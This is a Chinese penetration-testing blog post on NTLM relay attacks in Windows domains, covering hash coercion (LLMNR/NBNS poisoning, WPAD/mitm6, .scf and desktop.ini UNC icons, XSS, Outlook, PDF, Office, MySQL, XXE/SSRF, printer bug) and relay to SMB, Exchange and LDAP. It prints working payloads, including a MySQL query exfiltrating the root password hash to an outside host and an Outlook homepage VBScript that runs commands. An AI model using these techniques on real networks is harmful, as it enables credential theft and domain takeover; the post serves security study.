---
title: "内网渗透-ntlm_relay"
date: 2020-09-01 11:18:23 +0800
category: 内网渗透
tags: [内网,域]
excerpt: 内网渗透-ntlm_relay
---
# ntlm_relay
ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等。
那ntlm的上层协议是smb的情况下,ntlm_relay就是smb_relay。那如果上层协议是http，我们也可以叫做http_relay，但是都统称ntlm_relay。
##  reflet
如果Inventory Server和Target是同一台机子，那么也就是说我们攻击者拿到Inventory Server发来的请求之后，发回给Inventory Server进行认证。这个就是reflect
> 在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码只是保存在自己的SAM文件中，这个时候relay到别的机器，除非两台机器的账号密码一样，不然没有别的意义了，这个时候的攻击手段就是将机器reflect回机子本身。因此微软在ms08-068中对smb reflect到smb 做了限制。CVE-2019-1384(Ghost Potato)就是绕过了该补丁。

## 获取ntml
### LLMNR/NBNS欺骗
许多网络协议可以用来进行欺骗，从而进行中间人攻击，常见的有ARP、DHCP、DNS等。在实际的攻击中，使用LLMNR/NetBIOSNS欺骗的方式更多，因为这类欺骗的网络流量小，实施也更容易，与Net-NTLMhash relay attack的结合也更紧密。LLMNR和NetBIOSNS是Windows系统完成名称解析的一种方法。
+ Windows系统的名称解析顺序如下：
> 本地hosts文件（%windir%\System32\drivers\etc\hosts）
> DNS缓存/DNS服务器
> 链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）
![](https://image.3001.net/images/20190507/1557197044_5cd0f0f4212fe.png!small)
如果前两种方法名称解析失败，就会使用第三种方法进行解析。所以可以使用这两种协议来进行欺骗。

#### LLMNR协议
![](https://image.3001.net/images/20190507/1557197066_5cd0f10aa8652.png!small
LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP/5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。
LLMNR 进行名称解析的过程为：
> 检查本地 NetBIOS 缓存
> 如果缓存中没有则会像当前子网域发送广播
> 当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败
也就是说LLMNR并不需要一个服务器，而是采用广播包的形式，去询问DNS，跟ARP很像，那跟ARP投毒一样的一个安全问题就会出现。
当受害者访问一个不存在的域名的时候。比如 hhhhhhhhhhhhhhhhhhhh
![](https://p3.ssl.qhimg.com/t0178e10676ee7a9570.png)
受害者在Hosts 文件里面没有找到，通过DNS解析失败。就会通过LLMNR协议进行广播。
![](https://p2.ssl.qhimg.com/t01873898ea3999764e.png)
这个时候攻击者就发个响应包 hhhhhhhhhhhhhhhhhhhh对应的IP是x.x.x.x(这个ip是攻击者IP)进行LLMNR投毒。
![](https://p2.ssl.qhimg.com/t01e58d8a5e0e57e925.png)
+ 这一步可以通过Responder 实现。
![](https://p2.ssl.qhimg.com/t01998bb4a24d971eb4.png)
![](https://p5.ssl.qhimg.com/t01b8e48d04d47ec360.png)
这个时候hhhhhhhhhhhhhhhhhhhh映射的ip就是攻击者的IP，当受害者访问hhhhhhhhhhhhhhhhhhhh就会访问攻击者的IP，攻击者就能拿到net-ntlm hash.
![](https://p2.ssl.qhimg.com/t01ee5f89a57d2aabc0.png)

#### NBNS协议
![](https://image.3001.net/images/20190507/1557197089_5cd0f121d756e.png!small)
![](https://image.3001.net/images/20190507/1557197112_5cd0f1381c095.png!small)
全称是NetBIOS Name Service。
NetBIOS 协议进行名称解析的过程如下：
> 检查本地 NetBIOS 缓存
> 如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求
> 如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播
> 如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件
lmhosts 文件位于C:\Windows\System32\drivers\etc\目录中。
NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在。使用Responder也可以很方便得进行测试。这里不再重复展示。
![](https://p0.ssl.qhimg.com/t01ad13328225f1055f.png)

#### 实现 
这类攻击很容易实现，Windows下可以使用`Inveigh`，在Linux下可以使用`Responder`，
metasploit等模块
```
auxiliary/spoof/llmnr/llmnr_response、
auxiliary/spoof/mdns/mdns_response
```
### WPAD(劫持)和mitm6
wpad 全称是Web Proxy Auto-Discovery Protocol ，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。
![](https://p4.ssl.qhimg.com/t013131844a42207684.png)
默认自动检测设置是开启的。
PAC文件的格式如下
```
function FindProxyForURL(url, host) {
   if (url== 'http://www.baidu.com/') return 'DIRECT';
   if (host== 'twitter.com') return 'SOCKS 127.0.0.10:7070';
   if (dnsResolve(host) == '10.0.0.100') return 'PROXY 127.0.0.1:8086;DIRECT';
   return 'DIRECT';
}
```
WPAD的一般请求流程是(图片来源乌云drop)
![](https://p0.ssl.qhimg.com/t019d8c1f08fefc8c39.png)
用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。
查询PAC文件的顺序如下：
> 1.通过DHCP服务器
> 2.查询WPAD主机的IP
		Hosts
		DNS (cache / server) 
		LLMNR
		NBNS 
这个地方就涉及到两种攻击方式
#### 配合LLMNR/NBNS投毒
这是最早的攻击方式。用户在访问网页时，首先会查询PAC文件的位置。查询的地址是WPAD/wpad.dat。如果没有在域内专门配置这个域名的话，那么DNS解析失败的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少,这个时候我们就可以进行LLMNR投毒和NBNS投毒。Responder可以很方便得实现。
	1.受害者通过llmnr询问wpad主机在哪里，Responder通过llmnr投毒将wpad的ip指向Responder所在的服务器
![](https://p4.ssl.qhimg.com/t0117f2b2b74492c155.png)
	2.受害者访问WPAD/wpad.dat，Responder就能获取到用户的net-ntlm hash(这个Responder默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上-F 开启)
![](https://p4.ssl.qhimg.com/t019a47eced2dde37b8.png)
然后Responder通过伪造如下pac文件将代理指向 ISAProxySrv:3141。
```
function FindProxyForURL(url, host){
  if ((host == "localhost") 
      || shExpMatch(host, "localhost.*") 
      ||(host == "127.0.0.1") 
      || isPlainHostName(host)) return "DIRECT"; 
  if (dnsDomainIs(host, "RespProxySrv")
      ||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) 
                return "DIRECT"; 
  return 'PROXY ISAProxySrv:3141; DIRECT';}
```
	3.受害者会使用ISAProxySrv:3141作为代理，但是受害者不知道ISAProxySrv对应的ip是什么，所以会再次查询，Responder再次通过llmnr投毒进行欺骗。将ISAProxySrv指向Responder本身。然后开始中间人攻击。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等，Responder都支持。这里就不详细展开了。
![](https://p2.ssl.qhimg.com/t018c07f17c72927703.png)
![](https://p4.ssl.qhimg.com/t016ba5e76024598fbc.png)
![](https://p5.ssl.qhimg.com/t015a010924cea2849f.png)
然而，微软在2016年发布了MS16-077安全公告，添加了两个重要的保护措施，以缓解这类攻击行为：
1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。
2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。
#### 配合DHCPv6
前面说过，针对在查询WPAD的时候进行投毒欺骗这种攻击方式，微软添加了两个重要的保护措施
	1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。
	2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。
第二个保护措施比较好绕过，我们先来绕过这个。
> 更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。

这个其实比较好解决，在访问pac文件的时候，我们没办法获取到用户的net-ntlm hash。其实默认responder就不想在这一步获取net-ntlm hash，他默认不开启，要手动加`-F`选项才能开启。我们可以给用户返回一个正常的wpad。将代理指向我们自己，然后我们作为中间人。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等。这个可以回去上一小节`配合LLMNR/NBNS投毒`看看。

在网上也有一种比较巧妙的绕过姿势。我们可以给用户返回一个正常的wpad。将代理指向我们自己，当受害主机连接到我们的“代理”服务器时，我们可以通过HTTP CONNECT动作、或者GET请求所对应的完整URI路径来识别这个过程，然后回复HTTP 407错误（需要代理身份验证），这与401不同，IE/Edge以及Chrome浏览器（使用的是IE设置）会自动与代理服务器进行身份认证，即使在最新版本的Windows系统上也是如此。在Firefox中，用户可以配置这个选项，该选项默认处于启用状态。
所以我们接下来的任务是要来绕过第一个保护措施
`系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP选项或DNS协议完成该任务。`
这个就保证了llmnr投毒和nbns投毒不能用了。我们来回顾下用户获取pac文件的一般流程。
	1.通过DHCP服务器
	2.查询WPAD主机的IP
		Hosts
		DNS (cache / server)
		LLMNR
		NBNS
在MS16-077之后，通过DHCP和DNS协议还可以获取到pac文件。
DHCP和DNS都有指定的服务器，不是通过广播包，而且dhcp服务器和dns服务器我们是不可控的，没法进行投毒。
幸运的是安全研究人员并不将目光局限在ipv4，从Windows Vista以来，所有的Windows系统（包括服务器版系统）都会启用IPv6网络，并且其优先级要高于IPv4网络。这里我们要用到DHCPV6协议。
DHCPv6协议中，客户端通过向组播地址发送Solicit报文来定位DHCPv6服务器，组播地址[ff02::1:2]包括整个地址链路范围内的所有DHCPv6服务器和中继代理。DHCPv6四步交互过程，客户端向[ff02::1:2]组播地址发送一个Solicit请求报文，DHCP服务器或中继代理回应Advertise消息告知客户端。客户端选择优先级最高的服务器并发送Request信息请求分配地址或其他配置信息，最后服务器回复包含确认地址，委托前缀和配置（如可用的DNS或NTP服务器）的Relay消息。通俗点来说就是，在可以使用ipv6的情况(Windows Vista以后默认开启),攻击者能接收到其他机器的dhcpv6组播包的情况下，攻击者最后可以让受害者的DNS设置为攻击者的IPv6地址。
Fox-IT公布了名为`mitm6`的一个工具，可以实施这种攻击。
mitm6首先侦听攻击者计算机的某个网卡上的DHCPV6流量。
![](https://p0.ssl.qhimg.com/t01790566498077fb89.png)
![](https://p3.ssl.qhimg.com/t01e450d84acb5b4886.png)
当目标计算机重启或重新进行网络配置（如重新插入网线）时， 将会向DHCPv6发送请求获取IPv6配置
![](https://p0.ssl.qhimg.com/t0107c2b3399eb8c7e9.png)
这个时候mitm6将回复这些DHCPv6请求，并在链接本地范围内为受害者分配一个IPv6地址。尽管在实际的IPv6网络中，这些地址是由主机自己自动分配的，不需要由DHCP服务器配置，但这使我们有机会将攻击者IP设置为受害者的默认IPv6 DNS服务器。应当注意，mitm6当前仅针对基于Windows的操作系统，因为其他操作系统（如macOS和Linux）不使用DHCPv6进行DNS服务器分配
![](https://p5.ssl.qhimg.com/t016c35bea3e45cabc3.png)
这个时候受害者的dns 服务器的地址已经设置为攻击者的IPv6地址。一旦受害机器将攻击者设置为IPv6 DNS服务器，它将立即开始查询网络的WPAD配置。由于这些DNS查询是发送给攻击者的，因此攻击者仅可以使用自己的IP地址作为WPAD对应的IP地址。
![](https://p2.ssl.qhimg.com/t018d19d568176b275a.png)
至此MS16-077的两个保护措施都能绕过，再遇到MS16-077之后的机子不妨试试这种方法。
### 图标
#### desktop.ini
> 文件夹底下都有个文件desktop.ini来指定文件夹图标之类的。默认不可见。去掉隐藏受保护的操作系统文件就可以看到
> 每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了
> 将图标路径改成UNC路径，指向我们的服务器
![](https://p2.ssl.qhimg.com/t010a77d8e5b5f30c57.png)
![](https://p3.ssl.qhimg.com/t015d257a6f54d235c2.png)
当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash。
![](https://p0.ssl.qhimg.com/t0177cb454b7fb7506e.png)

#### scf 文件
只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式
```
[Shell]
Command=2
IconFile=\\172.16.100.1\scf\test.ico
[Taskbar]
Command=ToggleDesktop
```
新建test.scf，写入内容，放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash。
![](https://p2.ssl.qhimg.com/t01b937f566307adb94.png)
#### 用户头像
适用于Windows 10/2016/2019
在更改账户图片处
![](https://p2.ssl.qhimg.com/t019c8338b41bc63f6a.png)
用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。后面会详细讲
### 系统命令携带UNC路径
这个比较鸡肋，都能执行命令了，干啥不行呢。但作为一种场景，也说明下。说不定有些限制的命令注入就是支持传进UNC路径呢。我平时在测试的时候一般都是用 dir \\ip\xxx来做测试的，很多cmd命令是支持传进UNC路径的，执行的时候我们就可以拿到用户的net-ntlm hash了。至于有哪些命令。这篇文章总结了一些命令,总结得挺全面的。 [内网渗透——针对hash的攻击](https://www.anquanke.com/post/id/177123)
```
net.exe use \hostshare 
attrib.exe \hostshare  
bcdboot.exe \hostshare  
bdeunlock.exe \hostshare  
cacls.exe \hostshare  
certreq.exe \hostshare #(noisy, pops an error dialog) 
certutil.exe \hostshare  
cipher.exe \hostshare  
ClipUp.exe -l \hostshare  
cmdl32.exe \hostshare  
cmstp.exe /s \hostshare  
colorcpl.exe \hostshare #(noisy, pops an error dialog)  
comp.exe /N=0 \hostshare \hostshare  
compact.exe \hostshare  
control.exe \hostshare  
convertvhd.exe -source \hostshare -destination \hostshare 
Defrag.exe \hostshare  
diskperf.exe \hostshare  
dispdiag.exe -out \hostshare  
doskey.exe /MACROFILE=\hostshare  
esentutl.exe /k \hostshare  
expand.exe \hostshare  
extrac32.exe \hostshare  
FileHistory.exe \hostshare #(noisy, pops a gui)  
findstr.exe * \hostshare  
fontview.exe \hostshare #(noisy, pops an error dialog)  
fvenotify.exe \hostshare #(noisy, pops an access denied error)  
FXSCOVER.exe \hostshare #(noisy, pops GUI)  
hwrcomp.exe -check \hostshare  
hwrreg.exe \hostshare  
icacls.exe \hostshare   
licensingdiag.exe -cab \hostshare  
lodctr.exe \hostshare  
lpksetup.exe /p \hostshare /s  
makecab.exe \hostshare  
msiexec.exe /update \hostshare /quiet  
msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)  
mspaint.exe \hostshare #(noisy, invalid path to png error) 
msra.exe /openfile \hostshare #(noisy, error)  
mstsc.exe \hostshare #(noisy, error)  
netcfg.exe -l \hostshare -c p -i foo
```
### XSS
利用xss构造
```
<script src="\\172.16.100.1\xss">
```
![](https://p1.ssl.qhimg.com/t01d96892dd9bacd006.png)
这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域，以chrome为例
![](https://p0.ssl.qhimg.com/t01b5e489638e741140.png)
我们接下来尝试不通过UNC路径，就xss里面访问http请求来发起认证
把payload 改成
`<script src="//172.16.100.1/x">`
看到跳出认证框，我们也没抓到net-ntlm hash
![](https://p4.ssl.qhimg.com/t01d831a54fc5c0ddf4.png)
不像smb请求直接用当然用户名和密码去登录，发起http请求时，除非该站点的域名位于企业内部网或存在于可信站点列表中。否则都会跳出认证框来让操作者再输入一次。
![](https://p5.ssl.qhimg.com/t01cf6050d471e1b07f.png)
当我们选择`自动使用当前用户名和密码登录`就能拿到用户的net-ntlm hash
![](https://p5.ssl.qhimg.com/t011c799b3a99410492.png)
![](https://p2.ssl.qhimg.com/t01e21b083ca4f5bce3.png)
修改后的配置同样适用于chrome
那至今为止，在默认的配置情况底下，如果有xss，那构造的页面的效果有两种
构造unc，访问smb 协议，但是这种方式的话就只有IE和edge能行
`<script src="\\172.16.100.1\xss">`
构造http，访问http 协议，这种方式并不限制浏览器访问，但是除非该站点的域名位于企业内部网或存在于可信站点列表中，不然是不会使用系统默认的凭据进行登录的，会跳出认证框，让用户填写账号密码。
`<script src="//172.16.100.1\xss">`
第二点该站点的域名位于企业内部网也是行的，那如果我们可以修改控制域内的DNS是不是就可以动点手脚了。
在查看DNS的ACL的时候，我发现了一条规则
![](https://p3.ssl.qhimg.com/t0156594bf19f92141b.png)
认证用户都可以在DNS里面创建子对象，也就意味着如果我们是域内认证 用户的话，那我们就可以在域内添加域名。我们使用在kerberos篇里面提到过的Powermad里面的Invoke-DNSUpdate添加一条DNS记录
![](https://p1.ssl.qhimg.com/t010acabe37759199fa.png)
然后将我们的payload 换成
`<script  src="//xss\xss"></script>`
由于此时的域名位于企业内部网，所以当用户触发xss的时候会以当前用户去认证，我们也就能拿到用户的net-ntlm hash。
![](https://p3.ssl.qhimg.com/t01fdbc50b54c937fa6.png)
### outlook
发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload
```
<img src="\\172.16.100.1\outlook">
```
![](https://p4.ssl.qhimg.com/t017426b6c5935ad70f.png)
当收件人打开outlook查看邮件的时候
![](https://p2.ssl.qhimg.com/t01d0355f58c5bfc88e.png)
我们就收到net-ntlm hash了
![](https://p2.ssl.qhimg.com/t0149fd2b4bead9a8cb.png)
### PDF
PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件。我们直接使用三好学生的脚本https://github.com/3gstudent/Worse-PDF
![](https://p0.ssl.qhimg.com/t014e210fc585268122.png)
我们就收到net-ntlm hash
![](https://p3.ssl.qhimg.com/t013049dfc7f0793e76.png)
用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行。
在实际测试中使用Adobe,发现会有提示
![](https://p1.ssl.qhimg.com/t01a7438060c6b7fcad.png)
### office
首先新建一个word，贴近一张图片
![](https://p1.ssl.qhimg.com/t0177a0ec884d7c213f.png)
然后用7zip 打开(没测试其他软件，可自行测试)
进入word\_rels，修改document.xml.rels
![](https://p3.ssl.qhimg.com/t01b3ac738eafbe3ef8.png)
可以看到Target参数本来是本地的路径
![](https://p3.ssl.qhimg.com/t014b72910273a063aa.png)
修改为UNC路径，然后加上TargetMode="External"
![](https://p4.ssl.qhimg.com/t0122905cebda3dbc40.png)
当打开word的时候,我们就拿到net-ntlm hash
![](https://p0.ssl.qhimg.com/t016a7347543991009d.png)
### MySQL
我们知道在MySQL注入的话，是可以通过带外通信把数据带出来。语法如下。
```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));
```
需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)
仔细观察我们会发现LOAD_FILE是支持UNC路劲
我们构造
```
select load_file('\\\\172.16.100.1\\mysql');
```
拿到net-ntlm hash
![](https://p5.ssl.qhimg.com/t0171522a2d96fbcc32.png)
### XXE&&SSRF
#### XXE
在xxe里面加载外部文件的时候，如果路径支持unc路径的话，是能拿到net-ntlm hash的。
这里使用javajavax.xml.parsers进行测试,测试代码如下
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream());
```
![](https://p0.ssl.qhimg.com/t0196371e3c0a838947.png)
成功打回net-ntlm hash
![](https://p1.ssl.qhimg.com/t0148cdbaede51f0c63.png)
如果不支持UNC，可再测试http协议。
![](https://p4.ssl.qhimg.com/t01a738a620adf08b5f.png)
成功打回net-ntlm hash。
#### SSRF
在ssrf里面如果支持file协议，并且file协议能加载远程资源的话，是能拿到net-ntlm hash的。
这里使用JAVA的HttpURLConnection进行测试，测试代码如下
```java
URL u = new URL(url);
URLConnection urlConnection = u.openConnection();
HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;
BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream()));
```
当只支持HTTP协议的时候，也是可能打回net-ntlm hash的。
![](https://p5.ssl.qhimg.com/t01d47c4970589d80b9.png)
成功打回net-ntlm hash
各个语言触发XXE和SSRF的实现不同。同一门语言也有不同的触发方式，这里并没有一一测试。
只要支持UNC路径都能打回net-ntlm hash,如果支持http的话，得看底层实现，有些底层实现是需要判断是否在信任域的，有些底层实现是不需要判断是否信任域，有些需要判断是否信任域里面，但是判断是否在信任域的代码是这样。
```java
static class DefaultNTLMAuthenticationCallback extends NTLMAuthenticationCallback {
@Override
public boolean isTrustedSite(URL url) { return true; }
}
```
在xxe和ssrf测试中一般要测试这两个方面
	1.支不支持UNC路径，比如\\ip\x或者file://ip/x
	2.支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的
各个语言，各个模块的测试，这里并没有一一测试。
### 打印机漏洞
Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。
任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。
如下图，使用printerbug.py对172.16.100.5发起请求，172.16.100.5就会向172.16.100.1发起ntlm 请求。
![](https://p1.ssl.qhimg.com/t0194265565e1e16f3a.png)
![](https://p5.ssl.qhimg.com/t01b973a1501589a825.png)
## Relay
在Net-NTLM Hash的破解里面，如果是v1的话，拿到Net-NTLM就相当于拿NTLM HASH.这个时候就没有Relay的必要性了，但是在实际中遇到的例子往往不会是v1，而是v2。这个时候密码强度高一点，基本就跑不出来了，这种情况底下，不妨试一试Relay。
### Relay2SMB
能直接relay到smb服务器，是最直接最有效的方法。可以直接控制该服务器(包括但不限于在远程服务器上执行命令，上传exe到远程命令上执行，dump 服务器的用户hash等等等等)。
+ 主要有两种场景
1.工作组环境
	这个实用性比较差。在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码Hash只是保存在自己的SAM文件中，这个时候Relay到别的机器，除非两台机器的账号密码一样(如果账号密码一样，我为啥不直接pth呢)，不然没有别的意义了，这个时候的攻击手段就是将机器reflect回机子本身。因此微软在ms08-068中对smb reflect到smb 做了限制。这个补丁在CVE-2019-1384(Ghost Potato)被绕过。将在下篇文章里面详细讲。
2.域环境
	域环境底下域用户的账号密码Hash保存在域控的 ntds.dit里面。如下没有限制域用户登录到某台机子，那就可以将该域用户Relay到别人的机子，或者是拿到域控的请求，将域控Relay到普通的机子，比如域管运维所在的机子。(为啥不Relay到其他域控，因为域内就域控默认开启smb签名)
下面演示使用几款工具在域环境底下，从域控relay到普通机器执行命令
+ impacket 的底下的smbrelayx.pyi
![](https://p0.ssl.qhimg.com/t016aa0e38af8b20d9d.png)
+ impacket 的底下的ntlmrelayx.py
![](https://p5.ssl.qhimg.com/t01691f75c13d572006.png)
+ Responder底下的MultiRelay.py
![](https://p5.ssl.qhimg.com/t01cfb45589a4ab815f.png)
![](https://p0.ssl.qhimg.com/t01504ad4e6a29d3c92.png)
### Relay2EWS
Exchange的认证也是支持NTLM SSP的。我们可以relay的Exchange，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网，这是最刺激的。
下面演示通过[NtlmRelayToEWS](https://github.com/Arno0x/NtlmRelayToEWS.git)(事实上，工具挺多的。其他的大家可以上github自己找)来实现Relay2ews
![](https://p4.ssl.qhimg.com/t010d550875927b8f5e.png)
![](https://p0.ssl.qhimg.com/t011afceb68b79372ca.png)
![](https://p3.ssl.qhimg.com/t01d5e80035e172d3c5.png)
+ 配合homepage 能够实现命令执行的效果
	1.homepage的简易demo代码如下
```
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Outlook</title>
<script id=clientEventHandlersVBS language=vbscript>
<!--
 Sub window_onload()
     Set Application = ViewCtl1.OutlookApplication
     Set cmd = Application.CreateObject("Wscript.Shell")
     cmd.Run("calc")
 End Sub
-->

</script>
</head>

<body>
 <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
</body>
</html>
```
	2.放置于web服务器。在NtlmRelayToEWS 里面通过-u 参数指定
![](https://p2.ssl.qhimg.com/t016a591f9a50f67365.png)
![](https://p2.ssl.qhimg.com/t013d5593ffb2339f77.png)
### Relay2LDAP
不管是杀伤力巨大的8581还是1040。Relay到ldap都在里面发挥着巨大的作用。
relay 到ldap的话，能干嘛呢
这里着重介绍三种通用性比较强的利用思路。这三种在impacket里面的ntlmrelayx都有实现。(这三种通用性比较强而已，实际中这个的利用比较灵活，需要通过 nTSecurityDescriptor分析用户在域内对哪些acl有权限，什么权限。关于acl怎么深入利用,这里不再展开，后面在ldap篇会详细说明)
![](https://p4.ssl.qhimg.com/t01b31d966b33575140.png)
	1.高权限用户
如果NTLM发起用户在以下用户组
> Enterprise admins
> Domain admins
> Built-in Administrators
> Backup operators
> Account operators
那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管
![](https://p1.ssl.qhimg.com/t01e4daef09128988f5.png)
![](https://p4.ssl.qhimg.com/t01db1fea97b977fe39.png)
	1.write-acl 权限
如果发起者对
`DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)`
和
`DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)`
有write-acl 权限，那么就可以在该acl里面添加任意用户，从而使得该用户可以具备dcsync的权限
这个案例的典型例子就是Exchange Windows Permissions组，我们将在下一篇介绍8581的 时候详细说下这个用户组的权限。
![](https://p3.ssl.qhimg.com/t01e584908a9750a6e0.png)
![](https://p5.ssl.qhimg.com/t0183b05d5cce2a771d.png)
	1.普通用户权限
在server2012r2之后，如果没有以上两个权限。可以通过设置基于资源的约束委派。
在NTLM发起者属性马上到！S-AllowedToActOnBehalfOfOtherIdentity里面添加一条ace,可以让任何机器用户和服务用户可以控制该用户(NTLM发起者)。
![](https://p1.ssl.qhimg.com/t0162651181f81ddd6b.png)